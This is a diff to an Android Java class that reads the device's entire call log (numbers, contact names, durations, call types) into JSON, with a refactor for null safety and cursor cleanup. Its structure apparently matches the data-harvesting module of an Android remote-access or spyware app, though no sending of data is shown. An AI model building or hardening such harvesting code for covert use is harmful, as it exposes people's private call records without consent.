@@ -17,40 +17,49 @@ import org.json.JSONObject;
 
 public class CallsManager {
 
-    public static JSONObject getCallsLogs(){
-
+    public static JSONObject getCallsLogs() {
+        Cursor cur = null;
         try {
             JSONObject Calls = new JSONObject();
             JSONArray list = new JSONArray();
 
-//            Uri allCalls = Uri.parse("content://call_log/calls");
             Uri allCalls = CallLog.Calls.CONTENT_URI;
 
-            @SuppressLint("Recycle") Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);
+            cur = MainService.getContextOfApplication().getContentResolver().query(
+                    allCalls, null, null, null, null
+            );
+
+            if (cur == null) return null;
 
             while (cur.moveToNext()) {
                 JSONObject call = new JSONObject();
-                @SuppressLint("Range") String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
-                @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
-                @SuppressLint("Range") String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));// for duration
-                @SuppressLint("Range") int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.
 
+                int numIdx = cur.getColumnIndex(CallLog.Calls.NUMBER);
+                int nameIdx = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
+                int durIdx = cur.getColumnIndex(CallLog.Calls.DURATION);
+                int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);
+
+                String num = numIdx >= 0 ? cur.getString(numIdx) : "";
+                String name = nameIdx >= 0 ? cur.getString(nameIdx) : "";
+                String duration = durIdx >= 0 ? cur.getString(durIdx) : "0";
+                int type = typeIdx >= 0 ? Integer.parseInt(cur.getString(typeIdx)) : 0;
 
                 call.put("phoneNo", num);
-                call.put("name", name);
-                call.put("duration", duration);
+                call.put("name", name != null ? name : "");
+                call.put("duration", duration != null ? duration : "0");
                 call.put("type", type);
                 list.put(call);
-
             }
             Calls.put("callsList", list);
             return Calls;
-        }
-        catch (JSONException e) {
+        } catch (Exception e) {
             e.printStackTrace();
+            return null;
+        } finally {
+            if (cur != null && !cur.isClosed()) {
+                cur.close();
+            }
         }
-        return null;
-
     }
 
 }
